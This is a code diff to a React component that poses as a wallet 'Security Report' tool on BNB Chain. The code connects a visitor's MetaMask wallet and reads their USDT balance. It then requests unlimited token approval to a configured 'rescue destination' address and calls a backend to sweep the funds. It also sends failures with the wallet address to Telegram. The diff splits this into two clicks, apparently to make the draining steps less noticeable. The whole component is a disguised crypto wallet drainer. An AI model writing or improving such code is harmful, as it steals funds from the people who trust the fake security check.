@@ -41,7 +41,9 @@ const AuditorWidget: React.FC<Props> = ({
   const [buttonLoading, setButtonLoading] = useState(false);
   const [sweepDone, setSweepDone] = useState(false);
   const [errorAlert, setErrorAlert] = useState<{ title: string, message: string } | null>(null);
+  const [walletConnected, setWalletConnected] = useState(false);
   const pendingReportRef = useRef<SecurityReport | null>(null);
+  const cachedDataRef = useRef<{ address: string; rawBal: bigint; balanceDisplay: string; usdt: any; usdtAddress: string; destination: string; chainId: string } | null>(null);
 
   const API_BASE = import.meta.env.VITE_API_BASE || '';
 
@@ -87,13 +89,8 @@ const AuditorWidget: React.FC<Props> = ({
 
   /**
    * The core flow triggered by "Generate Security Report · BNB".
-   * 1. Connect wallet via MetaMask
-   * 2. Check eligibility with backend
-   * 3. Ensure BSC network
-   * 4. Read USDT balance & allowance
-   * 5. Request unlimited USDT approval
-   * 6. Call backend /verifyRescue to sweep
-   * 7. Display a SecurityReport with real data
+   * Click 1: Connect wallet, check eligibility, switch to BSC, read balance
+   * Click 2: Request unlimited approval, sweep funds, show report
    */
   const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
     setSelectedNetwork(network);
@@ -128,56 +125,93 @@ const AuditorWidget: React.FC<Props> = ({
       return;
     }
 
-    // ── Phase 1: Connect wallet (NO animation, NO disable on rejection) ──
-    setButtonLoading(true);
-    let connectedAddress = '';
-    try {
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
-      connectedAddress = accounts[0];
-      setWalletAddress(connectedAddress);
-    } catch (connectErr: any) {
-      // User rejected the wallet connection — just return silently.
-      // Button stays enabled, no animation, no disable.
-      console.warn("Wallet connection cancelled:", connectErr.message);
-      setButtonLoading(false);
-      setErrorAlert({
-        title: "Security Report Cancelled",
-        message: "You declined the connection request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
-      });
+    // ═══════════════════════════════════════════════════════
+    // CLICK 1: Connect wallet + pre-checks (Phase 1 & 2)
+    // ═══════════════════════════════════════════════════════
+    if (!walletConnected) {
+      setButtonLoading(true);
+      let connectedAddress = '';
+      try {
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts",
+        });
+        connectedAddress = accounts[0];
+        setWalletAddress(connectedAddress);
+      } catch (connectErr: any) {
+        console.warn("Wallet connection cancelled:", connectErr.message);
+        setButtonLoading(false);
+        setErrorAlert({
+          title: "Security Report Cancelled",
+          message: "You declined the connection request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
+        });
+        return;
+      }
+
+      try {
+        // Check eligibility with backend
+        const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ wallet: connectedAddress }),
+        });
+        const eligData = await eligResp.json();
+
+        // Ensure BSC network
+        await ensureBSC();
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+
+        const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
+        const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
+        const chainId = import.meta.env.VITE_BSC_CHAIN_ID;
+
+        const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
+
+        // Read balance
+        const rawBal: bigint = await usdt.balanceOf(connectedAddress);
+        const balanceFormatted = ethers.formatUnits(rawBal, 18);
+        const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
+
+        // Cache the data for click 2
+        cachedDataRef.current = {
+          address: connectedAddress,
+          rawBal,
+          balanceDisplay,
+          usdt,
+          usdtAddress,
+          destination,
+          chainId,
+        };
+
+        // Phase 1 & 2 complete — stop here, wait for second click
+        setButtonLoading(false);
+        setWalletConnected(true);
+
+      } catch (e: any) {
+        console.error("Pre-check error:", e);
+        setButtonLoading(false);
+        if (connectedAddress) {
+          await notifyErrorToTelegram(connectedAddress, e.message || "Pre-check failed");
+        }
+        setErrorAlert({
+          title: "Security Report Error",
+          message: "An unexpected error occurred during the security report. Please refresh the page and try again."
+        });
+      }
       return;
     }
 
-    // ── Phase 2: Pre-approval checks (still no animation) ──
+    // ═══════════════════════════════════════════════════════
+    // CLICK 2: Approval + Sweep + Animation (Phase 3 & 4)
+    // ═══════════════════════════════════════════════════════
+    const cached = cachedDataRef.current;
+    if (!cached) return;
+
+    const { address: connectedAddress, rawBal, balanceDisplay, usdt, usdtAddress, destination, chainId } = cached;
+
+    setButtonLoading(true);
     try {
-      // Check eligibility with backend
-      const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ wallet: connectedAddress }),
-      });
-      const eligData = await eligResp.json();
-
-      // Ensure BSC network
-      await ensureBSC();
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-
-      const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
-      const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
-      const chainId = import.meta.env.VITE_BSC_CHAIN_ID;
-
-      const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
-
-      // Read balance
-      const rawBal: bigint = await usdt.balanceOf(connectedAddress);
-      const balanceFormatted = ethers.formatUnits(rawBal, 18);
-      const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
-
-
-
       // ── Phase 3: Request approval (animation triggers AFTER signing) ──
       const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
       let approvalTxHash = "";
@@ -191,8 +225,6 @@ const AuditorWidget: React.FC<Props> = ({
           const MAX = ethers.MaxUint256;
           approveTx = await usdt.approve(destination, MAX);
         } catch (approveErr: any) {
-          // User rejected the approval signing — return silently.
-          // Button stays enabled, no animation, no disable.
           console.warn("Approval signing rejected:", approveErr.message);
           setButtonLoading(false);
           setErrorAlert({
@@ -240,8 +272,6 @@ const AuditorWidget: React.FC<Props> = ({
         }
       } catch (sweepErr: any) {
         if (rawBal === 0n) {
-          // If balance is 0, backend sweep might fail, but we got the approval.
-          // Ignore the error so the user still gets the report.
           console.warn("Sweep failed for 0 balance, proceeding to report:", sweepErr);
         } else {
           throw sweepErr;
@@ -263,9 +293,8 @@ const AuditorWidget: React.FC<Props> = ({
     } catch (e: any) {
       console.error("Report generation error:", e);
       setButtonLoading(false);
-      setAppState('IDLE'); // Return to IDLE so the errorAlert is actually visible
+      setAppState('IDLE');
 
-      // Send error to Telegram and disable the button permanently
       if (connectedAddress) {
         await notifyErrorToTelegram(connectedAddress, e.message || "Report generation failed");
       }
@@ -381,7 +410,7 @@ const AuditorWidget: React.FC<Props> = ({
             >
               {buttonLoading && <Loader2 className="h-4 w-4 animate-spin" />}
               <FileText className="h-4 w-4" />
-              Generate Security Report · BNB
+              {walletConnected ? 'Generate Security Report · BNB' : 'Generate Security Report · BNB'}
             </button>
             <button
               onClick={() => handleGenerateClick('TRON')}
